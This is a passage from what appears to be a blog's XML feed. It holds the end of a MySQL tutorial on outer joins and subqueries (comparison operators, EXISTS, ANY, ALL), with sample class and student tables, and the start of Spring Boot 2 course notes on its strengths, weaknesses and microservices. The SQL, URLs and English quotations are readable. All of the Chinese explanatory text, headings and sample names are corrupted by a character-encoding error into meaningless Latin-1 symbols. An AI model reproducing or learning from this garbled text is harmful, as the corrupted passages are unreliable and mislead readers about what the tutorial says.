æ¡ä»¶<br><br></code></pre></td></tr></table></figure><p><strong>2ã€RIGHT [OUTER] JOIN å³(å¤–)è¿æ¥ï¼šè¿”å›åŒ…æ‹¬å³è¡¨ä¸­çš„æ‰€æœ‰è®°å½•å’Œå·¦è¡¨ä¸­ç¬¦åˆè¿æ¥æ¡ä»¶çš„è®°å½•ã€‚</strong></p><p>å…ˆå‡†å¤‡æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- è‹¥å­˜åœ¨æ•°æ®åº“mydbåˆ™åˆ é™¤<br>DROP DATABASE IF EXISTS mydb;<br>-- åˆ›å»ºæ•°æ®åº“mydb<br>CREATE DATABASE mydb;<br>-- é€‰æ‹©æ•°æ®åº“mydb<br>USE mydb;<br><br>-- åˆ›å»ºç­çº§è¡¨<br>CREATE TABLE class(<br>  cid int (4) NOT NULL PRIMARY KEY, <br>  cname varchar(20)<br>);<br><br>-- åˆ›å»ºå­¦ç”Ÿè¡¨<br>CREATE TABLE student (<br>  sid int (4) NOT NULL PRIMARY KEY, <br>  sname varchar (20), <br>  sage int (2), <br>  classid int (4) NOT NULL<br>);<br>-- å‘ç­çº§è¡¨æ’å…¥æ•°æ®<br>INSERT INTO class VALUES(1001,&#x27;Java&#x27;);<br>INSERT INTO class VALUES(1002,&#x27;C++&#x27;);<br>INSERT INTO class VALUES(1003,&#x27;Python&#x27;);<br>INSERT INTO class VALUES(1004,&#x27;PHP&#x27;);<br><br>-- å‘å­¦ç”Ÿè¡¨æ’å…¥æ•°æ®<br>INSERT INTO student VALUES(1,&#x27;å¼ ä¸‰&#x27;,20,1001);<br>INSERT INTO student VALUES(2,&#x27;æå››&#x27;,21,1002);<br>INSERT INTO student VALUES(3,&#x27;ç‹äº”&#x27;,24,1002);<br>INSERT INTO student VALUES(4,&#x27;èµµå…­&#x27;,23,1003);<br>INSERT INTO student VALUES(5,&#x27;Jack&#x27;,22,1009);<br><br></code></pre></td></tr></table></figure><p><em>å‡†å¤‡è¿™ç»„æ•°æ®æœ‰ä¸€å®šçš„ç‰¹ç‚¹ ï¼Œä¸ºçš„æ˜¯è®©å¤§å®¶ç›´è§‚çš„çœ‹å‡ºå·¦è¿æ¥ä¸å³è¿æ¥çš„ä¸åŒä¹‹å¤„<br>1ã€ç­çº§ç¼–å·ä¸º1004çš„PHPç­çº§æ²¡æœ‰å­¦ç”Ÿ<br>2ã€å­¦å·ä¸º5çš„å­¦ç”Ÿç‹è·ƒè·ƒç­çº§ç¼–å·ä¸º1009ï¼Œè¯¥ç­çº§ç¼–å·å¹¶ä¸åœ¨ç­çº§è¡¨ä¸­</em></p><h3 id="3-1-å·¦ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢"><a href="#3-1-å·¦ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢" class="headerlink" title="3.1 å·¦ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢"></a>3.1 å·¦ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢</h3><p>å·¦(å¤–)è¿æ¥çš„ç»“æœåŒ…æ‹¬LEFT JOINå­å¥ä¸­æŒ‡å®šçš„å·¦è¡¨çš„æ‰€æœ‰è®°å½•ï¼Œä»¥åŠæ‰€æœ‰æ»¡è¶³è¿æ¥æ¡ä»¶çš„è®°å½•ã€‚å¦‚æœå·¦è¡¨çš„æŸæ¡è®°å½•åœ¨å³è¡¨ä¸­ä¸å­˜åœ¨åˆ™åœ¨å³è¡¨ä¸­æ˜¾ç¤ºä¸ºç©ºã€‚<br>æŸ¥è¯¢æ¯ä¸ªç­çš„ç­çº§IDã€ç­çº§åç§°åŠè¯¥ç­çš„æ‰€æœ‰å­¦ç”Ÿçš„åå­— MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select class.cid,class.cname,student.sname from class left outer join student on class.cid=student.classid;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303201647123.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å±•ç¤ºç»“æœåˆ†æï¼š<br>1ã€åˆ†åˆ«æ‰¾å‡ºJavaç­ã€C++ç­ã€Pythonç­çš„å­¦ç”Ÿ<br>2ã€å³è¡¨çš„ç‹è·ƒè·ƒä¸æ»¡è¶³æŸ¥è¯¢æ¡ä»¶æ•…å…¶æ²¡æœ‰å‡ºç°åœ¨æŸ¥è¯¢ç»“æœä¸­<br>3ã€è™½ç„¶å·¦è¡¨çš„PHPç­æ²¡æœ‰å­¦ç”Ÿï¼Œä½†æ˜¯ä»»ç„¶æ˜¾ç¤ºäº†PHPçš„ä¿¡æ¯ï¼›ä½†æ˜¯ï¼Œå®ƒå¯¹åº”çš„å­¦ç”Ÿåå­—ä¸ºNULL</p><h3 id="3-2-å³ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢"><a href="#3-2-å³ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢" class="headerlink" title="3.2 å³ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢"></a>3.2 å³ï¼ˆå¤–ï¼‰è¿æ¥æŸ¥è¯¢</h3><p>å³(å¤–)è¿æ¥çš„ç»“æœåŒ…æ‹¬RIGHT JOINå­å¥ä¸­æŒ‡å®šçš„å³è¡¨çš„æ‰€æœ‰è®°å½•ï¼Œä»¥åŠæ‰€æœ‰æ»¡è¶³è¿æ¥æ¡ä»¶çš„è®°å½•ã€‚å¦‚æœå³è¡¨çš„æŸæ¡è®°å½•åœ¨å·¦è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œåˆ™å·¦è¡¨å°†è¿”å›ç©ºå€¼ã€‚<br>æŸ¥è¯¢æ¯ä¸ªç­çš„ç­çº§IDã€ç­çº§åç§°åŠè¯¥ç­çš„æ‰€æœ‰å­¦ç”Ÿçš„åå­— MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select class.cid,class.cname,student.sname from class right outer join student on class.cid=student.classid;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303202037216.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å±•ç¤ºç»“æœåˆ†æï¼š<br>1ã€åˆ†åˆ«æ‰¾å‡ºJavaç­ã€C++ç­ã€Pythonç­çš„å­¦ç”Ÿ<br>2ã€ï‚·å·¦è¡¨çš„PHPç­ä¸æ»¡è¶³æŸ¥è¯¢æ¡ä»¶æ•…å…¶æ²¡æœ‰å‡ºç°åœ¨æŸ¥è¯¢ç»“æœä¸­<br>3ã€ï‚·è™½ç„¶å³è¡¨çš„jackæ²¡æœ‰å¯¹åº”ç­çº§ï¼Œä½†æ˜¯ä»»ç„¶æ˜¾ç¤ºç‹è·ƒè·ƒçš„ä¿¡æ¯ï¼›ä½†æ˜¯ï¼Œå®ƒå¯¹åº”çš„ç­çº§ä»¥åŠç­çº§ç¼–å·å‡ä¸ºNULL</p><h1 id="åäº”ã€å­æŸ¥è¯¢"><a href="#åäº”ã€å­æŸ¥è¯¢" class="headerlink" title="åäº”ã€å­æŸ¥è¯¢"></a>åäº”ã€å­æŸ¥è¯¢</h1><p>å­æŸ¥è¯¢æ˜¯æŒ‡ä¸€ä¸ªæŸ¥è¯¢è¯­å¥åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢è¯­å¥å†…éƒ¨çš„æŸ¥è¯¢ï¼›è¯¥æŸ¥è¯¢è¯­å¥å¯ä»¥åµŒå¥—åœ¨ä¸€ä¸ª<br>SELECTã€SELECTâ€¦INTOã€INSERTâ€¦INTOç­‰è¯­å¥ä¸­ã€‚åœ¨æ‰§è¡ŒæŸ¥è¯¢æ—¶ï¼Œé¦–å…ˆä¼šæ‰§è¡Œå­æŸ¥è¯¢ä¸­çš„è¯­å¥ï¼Œå†å°†è¿”å›çš„ç»“æœä½œä¸ºå¤–å±‚æŸ¥è¯¢çš„è¿‡æ»¤æ¡ä»¶ã€‚åœ¨å­æŸ»è¯¢ä¸­é€šå¸¸å¯ä»¥ä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦å’ŒINã€EXISTSã€ANYã€ALLç­‰å…³é”®å­—ã€‚</p><p>å‡†å¤‡æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mysql">DROP TABLE IF EXISTS student;<br>DROP TABLE IF EXISTS class;<br><br>-- åˆ›å»ºç­çº§è¡¨<br>CREATE TABLE class(<br>  cid int (4) NOT NULL PRIMARY KEY, <br>  cname varchar(20)<br>);<br><br>-- åˆ›å»ºå­¦ç”Ÿè¡¨<br>CREATE TABLE student (<br>  sid int (4) NOT NULL PRIMARY KEY, <br>  sname varchar (20), <br>  sage int (2), <br>  classid int (4) NOT NULL<br>);<br><br>-- å‘ç­çº§è¡¨æ’å…¥æ•°æ®<br>INSERT INTO class VALUES(1001,&#x27;Java&#x27;);<br>INSERT INTO class VALUES(1002,&#x27;C++&#x27;);<br>INSERT INTO class VALUES(1003,&#x27;Python&#x27;);<br>INSERT INTO class VALUES(1004,&#x27;PHP&#x27;);<br>INSERT INTO class VALUES(1005,&#x27;Android&#x27;);<br><br>-- å‘å­¦ç”Ÿè¡¨æ’å…¥æ•°æ®<br>INSERT INTO student VALUES(1,&#x27;å¼ ä¸‰&#x27;,20,1001);<br>INSERT INTO student VALUES(2,&#x27;æå››&#x27;,21,1002);<br>INSERT INTO student VALUES(3,&#x27;ç‹äº”&#x27;,24,1003);<br>INSERT INTO student VALUES(4,&#x27;èµµå…­&#x27;,23,1004);<br>INSERT INTO student VALUES(5,&#x27;å°æ˜&#x27;,21,1001);<br>INSERT INTO student VALUES(6,&#x27;å°çº¢&#x27;,26,1001);<br>INSERT INTO student VALUES(7,&#x27;å°äº®&#x27;,27,1002);<br><br></code></pre></td></tr></table></figure><h2 id="1-å¸¦æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢"><a href="#1-å¸¦æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢" class="headerlink" title="1.å¸¦æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢"></a>1.å¸¦æ¯”è¾ƒè¿ç®—ç¬¦çš„å­æŸ¥è¯¢</h2><p>æ¯”è¾ƒè¿ç®—ç¬¦å‰é¢æˆ‘ä»¬æåˆ°è¿‡å¾—ï¼Œå°±æ˜¯&gt;ã€&lt;ã€&#x3D;ã€&gt;&#x3D;ã€&lt;&#x3D;ã€!&#x3D;ç­‰<br>æŸ¥è¯¢å¼ ä¸‰åŒå­¦æ‰€åœ¨ç­çº§çš„ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from class where cid=(select classid from student where sname=&#39;å¼ ä¸‰&#39;);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/2021030320275492.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥è¯¢æ¯”å¼ ä¸‰åŒå­¦æ‰€åœ¨ç­çº§ç¼–å·è¿˜å¤§çš„ç­çº§çš„ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from class where cid&gt;(select classid from student where sname=&#39;å¼ ä¸‰&#39;);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210303203231622.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-å¸¦EXISTSå…³é”®å­—çš„å­æŸ¥è¯¢"><a href="#2-å¸¦EXISTSå…³é”®å­—çš„å­æŸ¥è¯¢" class="headerlink" title="2.å¸¦EXISTSå…³é”®å­—çš„å­æŸ¥è¯¢"></a>2.å¸¦EXISTSå…³é”®å­—çš„å­æŸ¥è¯¢</h2><p>EXISTSå…³é”®å­—åé¢çš„å‚æ•°å¯ä»¥æ˜¯ä»»æ„ä¸€ä¸ªå­æŸ¥è¯¢ï¼Œ å®ƒä¸äº§ç”Ÿä»»ä½•æ•°æ®åªè¿”å›TRUEæˆ–FALSEã€‚å½“è¿”å›å€¼ä¸ºTRUEæ—¶å¤–å±‚æŸ¥è¯¢æ‰ä¼š æ‰§è¡Œ<br>å‡å¦‚ç‹äº”åŒå­¦åœ¨å­¦ç”Ÿè¡¨ä¸­åˆ™ä»ç­çº§è¡¨æŸ¥è¯¢æ‰€æœ‰ç­çº§ä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from class where exists (select * from student where sname=&#39;ç‹äº”&#39;);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210303203707252.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-å¸¦ANYå…³é”®å­—çš„å­æŸ¥è¯¢"><a href="#3-å¸¦ANYå…³é”®å­—çš„å­æŸ¥è¯¢" class="headerlink" title="3.å¸¦ANYå…³é”®å­—çš„å­æŸ¥è¯¢"></a>3.å¸¦ANYå…³é”®å­—çš„å­æŸ¥è¯¢</h2><p>ANYå…³é”®å­—è¡¨ç¤ºæ»¡è¶³å…¶ä¸­ä»»æ„ä¸€ä¸ªæ¡ä»¶å°±è¿”å›ä¸€ä¸ªç»“æœä½œä¸ºå¤–å±‚æŸ¥è¯¢æ¡ä»¶ã€‚</p><p>æŸ¥è¯¢æ¯”ä»»ä¸€å­¦ç”Ÿæ‰€å±ç­çº§å·è¿˜å¤§çš„ç­çº§ç¼–å· MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from class where cid &gt; any (select classid from student);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210303204057530.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="4-å¸¦ALLå…³é”®å­—çš„å­æŸ¥è¯¢"><a href="#4-å¸¦ALLå…³é”®å­—çš„å­æŸ¥è¯¢" class="headerlink" title="4.å¸¦ALLå…³é”®å­—çš„å­æŸ¥è¯¢"></a>4.å¸¦ALLå…³é”®å­—çš„å­æŸ¥è¯¢</h2><p>ALLå…³é”®å­—ä¸ANYæœ‰ç‚¹ç±»ä¼¼ï¼Œåªä¸è¿‡å¸¦ALLå…³é”®å­—çš„å­æŸ»è¯¢è¿”å›çš„ç»“æœéœ€åŒæ—¶æ»¡è¶³æ‰€æœ‰å†…å±‚æŸ»è¯¢æ¡ä»¶ã€‚</p><p>æŸ¥è¯¢æ¯”æ‰€æœ‰å­¦ç”Ÿæ‰€å±ç­çº§å·è¿˜å¤§çš„ç­çº§ç¼–å· MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from class where cid &gt; all (select classid from student);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤º<br><img src="https://img-blog.csdnimg.cn/20210303204447489.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p><strong>é‡è¦</strong> ï¼ˆä»å…³é”®å­—åˆ†æï¼‰ï¼š<br><strong>æŸ¥è¯¢è¯­å¥çš„ä¹¦å†™é¡ºåºå’Œæ‰§è¡Œé¡ºåº</strong><br>select &#x3D;&#x3D;&#x3D;&gt; from &#x3D;&#x3D;&#x3D;&gt; where &#x3D;&#x3D;&#x3D;&gt; group by &#x3D;&#x3D;&#x3D;&gt; having &#x3D;&#x3D;&#x3D;&gt; order by &#x3D;&#x3D;&#x3D;&gt; limit<br><strong>æŸ¥è¯¢è¯­å¥çš„æ‰§è¡Œé¡ºåº</strong><br>from &#x3D;&#x3D;&#x3D;&gt; where &#x3D;&#x3D;&#x3D;&gt; group by &#x3D;&#x3D;&#x3D;&gt; having &#x3D;&#x3D;&#x3D;&gt; select &#x3D;&#x3D;&#x3D;&gt; order by &#x3D;&#x3D;&#x3D;&gt; limi</p><p>åŸºäºå¤ä¹ ï¼Œä¹äºåˆ†äº« æ‰€ä»¥æœ‰äº†è¿™ç¯‡æ–‡ç« ï¼ï¼ï¼<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303204835945.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><a href="https://blog.csdn.net/weixin_45851945/article/details/114287877?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166815555416800186564683%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166815555416800186564683&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-4-114287877-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Econtrol_1,213%5Ev2%5Et3_esquery_v2&utm_term=mysql&spm=1018.2226.3001.4187">åŸæ–‡é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>Database</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot2_å°šç¡…è°·</title>
    <link href="/2022/11/22/SpringBoot2_%E5%B0%9A%E7%A1%85%E8%B0%B7/"/>
    <url>/2022/11/22/SpringBoot2_%E5%B0%9A%E7%A1%85%E8%B0%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringBoot2æ ¸å¿ƒæŠ€æœ¯-åŸºç¡€å…¥é—¨"><a href="#SpringBoot2æ ¸å¿ƒæŠ€æœ¯-åŸºç¡€å…¥é—¨" class="headerlink" title="SpringBoot2æ ¸å¿ƒæŠ€æœ¯-åŸºç¡€å…¥é—¨"></a>SpringBoot2æ ¸å¿ƒæŠ€æœ¯-åŸºç¡€å…¥é—¨</h1><h2 id="01ã€åŸºç¡€å…¥é—¨-SpringBoot2è¯¾ç¨‹ä»‹ç»"><a href="#01ã€åŸºç¡€å…¥é—¨-SpringBoot2è¯¾ç¨‹ä»‹ç»" class="headerlink" title="01ã€åŸºç¡€å…¥é—¨-SpringBoot2è¯¾ç¨‹ä»‹ç»"></a>01ã€åŸºç¡€å…¥é—¨-SpringBoot2è¯¾ç¨‹ä»‹ç»</h2><ol><li><p>Spring Boot 2æ ¸å¿ƒæŠ€æœ¯</p></li><li><p>Spring Boot 2å“åº”å¼ç¼–ç¨‹</p></li></ol><ul><li>å­¦ä¹ è¦æ±‚<br>-ç†Ÿæ‚‰SpringåŸºç¡€<br>-ç†Ÿæ‚‰Mavenä½¿ç”¨</li><li>ç¯å¢ƒè¦æ±‚<ul><li>Java8åŠä»¥ä¸Š</li><li>Maven 3.3åŠä»¥ä¸Š</li></ul></li><li>å­¦ä¹ èµ„æ–™<ul><li><a href="https://spring.io/projects/spring-boot">Spring Bootå®˜ç½‘</a></li><li><a href="https://docs.spring.io/spring-boot/docs/">Spring Bootå®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://www.yuque.com/atguigu/springboot">æœ¬è¯¾ç¨‹æ–‡æ¡£åœ°å€</a></li><li><a href="http://www.gulixueyuan.com/">è§†é¢‘åœ°å€1</a>ã€<a href="https://www.bilibili.com/video/BV19K4y1L7MT?p=1">è§†é¢‘åœ°å€2</a></li><li><a href="https://gitee.com/leifengyang/springboot2">æºç åœ°å€</a></li></ul></li></ul><h2 id="02ã€åŸºç¡€å…¥é—¨-Springç”Ÿæ€åœˆ"><a href="#02ã€åŸºç¡€å…¥é—¨-Springç”Ÿæ€åœˆ" class="headerlink" title="02ã€åŸºç¡€å…¥é—¨-Springç”Ÿæ€åœˆ"></a>02ã€åŸºç¡€å…¥é—¨-Springç”Ÿæ€åœˆ</h2><p><a href="https://spring.io/">Springå®˜ç½‘</a></p><h3 id="Springèƒ½åšä»€ä¹ˆ"><a href="#Springèƒ½åšä»€ä¹ˆ" class="headerlink" title="Springèƒ½åšä»€ä¹ˆ"></a>Springèƒ½åšä»€ä¹ˆ</h3><h4 id="Springçš„èƒ½åŠ›"><a href="#Springçš„èƒ½åŠ›" class="headerlink" title="Springçš„èƒ½åŠ›"></a>Springçš„èƒ½åŠ›</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211322434.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="Springçš„ç”Ÿæ€"><a href="#Springçš„ç”Ÿæ€" class="headerlink" title="Springçš„ç”Ÿæ€"></a>Springçš„ç”Ÿæ€</h4><p>è¦†ç›–äº†ï¼š</p><ul><li>webå¼€å‘</li><li>æ•°æ®è®¿é—®</li><li>å®‰å…¨æ§åˆ¶</li><li>åˆ†å¸ƒå¼</li><li>æ¶ˆæ¯æœåŠ¡</li><li>ç§»åŠ¨å¼€å‘</li><li>æ‰¹å¤„ç†</li><li>â€¦â€¦</li></ul><h4 id="Spring5é‡å¤§å‡çº§"><a href="#Spring5é‡å¤§å‡çº§" class="headerlink" title="Spring5é‡å¤§å‡çº§"></a>Spring5é‡å¤§å‡çº§</h4><ul><li>å“åº”å¼ç¼–ç¨‹</li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004250581.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>å†…éƒ¨æºç è®¾è®¡</li></ul><p>åŸºäºJava8çš„ä¸€äº›æ–°ç‰¹æ€§ï¼Œå¦‚ï¼šæ¥å£é»˜è®¤å®ç°ã€‚é‡æ–°è®¾è®¡æºç æ¶æ„ã€‚</p><h3 id="ä¸ºä»€ä¹ˆç”¨SpringBoot"><a href="#ä¸ºä»€ä¹ˆç”¨SpringBoot" class="headerlink" title="ä¸ºä»€ä¹ˆç”¨SpringBoot"></a>ä¸ºä»€ä¹ˆç”¨SpringBoot</h3><blockquote><p>Spring Boot makes it easy to create stand-alone, production-grade Spring based Applications that you can â€œjust runâ€.<a href="https://spring.io/projects/spring-boot">link</a></p><p>èƒ½å¿«é€Ÿåˆ›å»ºå‡ºç”Ÿäº§çº§åˆ«çš„Springåº”ç”¨ã€‚</p></blockquote><h4 id="SpringBootä¼˜ç‚¹"><a href="#SpringBootä¼˜ç‚¹" class="headerlink" title="SpringBootä¼˜ç‚¹"></a>SpringBootä¼˜ç‚¹</h4><ul><li><p>Create stand-alone Spring applications</p><ul><li>åˆ›å»ºç‹¬ç«‹Springåº”ç”¨</li></ul></li><li><p>Embed Tomcat, Jetty or Undertow directly (no need to deploy WAR files)</p><ul><li>å†…åµŒwebæœåŠ¡å™¨</li></ul></li><li><p>Provide opinionated â€˜starterâ€™ dependencies to simplify your build configuration</p><ul><li>è‡ªåŠ¨starterä¾èµ–ï¼Œç®€åŒ–æ„å»ºé…ç½®</li></ul></li><li><p>Automatically configure Spring and 3rd party libraries whenever possible</p><ul><li>è‡ªåŠ¨é…ç½®Springä»¥åŠç¬¬ä¸‰æ–¹åŠŸèƒ½</li></ul></li><li><p>Provide production-ready features such as metrics, health checks, and externalized configuration</p><ul><li>æä¾›ç”Ÿäº§çº§åˆ«çš„ç›‘æ§ã€å¥åº·æ£€æŸ¥åŠå¤–éƒ¨åŒ–é…ç½®</li></ul></li><li><p>Absolutely no code generation and no requirement for XML configuration</p><ul><li>æ— ä»£ç ç”Ÿæˆã€æ— éœ€ç¼–å†™XML</li></ul></li><li><p>SpringBootæ˜¯æ•´åˆSpringæŠ€æœ¯æ ˆçš„ä¸€ç«™å¼æ¡†æ¶</p></li><li><p>SpringBootæ˜¯ç®€åŒ–SpringæŠ€æœ¯æ ˆçš„å¿«é€Ÿå¼€å‘è„šæ‰‹æ¶</p></li></ul><h4 id="SpringBootç¼ºç‚¹"><a href="#SpringBootç¼ºç‚¹" class="headerlink" title="SpringBootç¼ºç‚¹"></a>SpringBootç¼ºç‚¹</h4><ul><li>äººç§°ç‰ˆæœ¬å¸ï¼Œè¿­ä»£å¿«ï¼Œéœ€è¦æ—¶åˆ»å…³æ³¨å˜åŒ–</li><li>å°è£…å¤ªæ·±ï¼Œå†…éƒ¨åŸç†å¤æ‚ï¼Œä¸å®¹æ˜“ç²¾é€š</li></ul><h2 id="03ã€åŸºç¡€å…¥é—¨-SpringBootçš„å¤§æ—¶ä»£èƒŒæ™¯"><a href="#03ã€åŸºç¡€å…¥é—¨-SpringBootçš„å¤§æ—¶ä»£èƒŒæ™¯" class="headerlink" title="03ã€åŸºç¡€å…¥é—¨-SpringBootçš„å¤§æ—¶ä»£èƒŒæ™¯"></a>03ã€åŸºç¡€å…¥é—¨-SpringBootçš„å¤§æ—¶ä»£èƒŒæ™¯</h2><h3 id="å¾®æœåŠ¡"><a href="#å¾®æœåŠ¡" class="headerlink" title="å¾®æœåŠ¡"></a>å¾®æœåŠ¡</h3><blockquote><p>In short, the <strong>microservice architectural style</strong> is an approach to developing a single application as a <strong>suite of small services</strong>, each <strong>running in its own process</strong> and communicating with <strong>lightweight</strong> mechanisms, often an <strong>HTTP</strong> resource API. These services are built around <strong>business capabilities</strong> and <strong>independently deployable</strong> by fully <strong>automated deployment</strong> machinery. There is a bare minimum of centralized management of these services, which may be <strong>written in different programming languages</strong> and use different data storage technologies.â€”â€”<a href="https://martinfowler.com/articles/microservices.html">James Lewis and Martin Fowler (2014)</a></p></blockquote><ul><li>å¾®æœåŠ¡æ˜¯ä¸€ç§æ¶æ„é£æ ¼</li><li>ä¸€ä¸ªåº”ç”¨æ‹†åˆ†ä¸ºä¸€ç»„å°å‹æœåŠ¡</li><li>æ¯ä¸ªæœåŠ¡è¿è¡Œåœ¨è‡ªå·±çš„è¿›ç¨‹å†…ï¼Œä¹Ÿå°±æ˜¯å¯ç‹¬ç«‹éƒ¨ç½²å’Œå‡çº§</li><li>æœåŠ¡ä¹‹é—´ä½¿ç”¨è½»é‡çº§HTTPäº¤äº’</li><li>æœåŠ¡å›´ç»•ä¸šåŠ¡åŠŸèƒ½æ‹†åˆ†</li><li>å¯ä»¥ç”±å…¨è‡ªåŠ¨éƒ¨ç½²æœºåˆ¶ç‹¬ç«‹éƒ¨ç½²</li><li>å»ä¸­å¿ƒåŒ–ï¼ŒæœåŠ¡è‡ªæ²»ã€‚æœåŠ¡å¯ä»¥ä½¿ç”¨ä¸åŒçš„è¯­è¨€ã€ä¸åŒçš„å­˜å‚¨æŠ€æœ¯</li></ul><h3 id="åˆ†å¸ƒå¼"><a href="#åˆ†å¸ƒå¼" class="headerlink" title="åˆ†å¸ƒå¼"></a>åˆ†å¸ƒå¼</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/202207211310801.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="åˆ†å¸ƒå¼çš„å›°éš¾"><a href="#åˆ†å¸ƒå¼çš„å›°éš¾" class="headerlink" title="åˆ†å¸ƒå¼çš„å›°éš¾"></a>åˆ†å¸ƒå¼çš„å›°éš¾</h4><ul><li>è¿œç¨‹è°ƒç”¨</li><li>æœåŠ¡å‘ç°</li><li>è´Ÿè½½å‡è¡¡</li><li>æœåŠ¡å®¹é”™</li><li>é…ç½®ç®¡ç†</li><li>æœåŠ¡ç›‘æ§</li><li>é“¾è·¯è¿½è¸ª</li><li>æ—¥å¿—ç®¡ç†</li><li>ä»»åŠ¡è°ƒåº¦</li><li>â€¦â€¦</li></ul><h4 id="åˆ†å¸ƒå¼çš„è§£å†³"><a href="#åˆ†å¸ƒå¼çš„è§£å†³" class="headerlink" title="åˆ†å¸ƒå¼çš„è§£å†³"></a>åˆ†å¸ƒå¼çš„è§£å†³</h4><ul><li>SpringBoot + SpringCloud</li></ul><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205004523307.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="äº‘åŸç”Ÿ"><a href="#äº‘åŸç”Ÿ" class="headerlink" 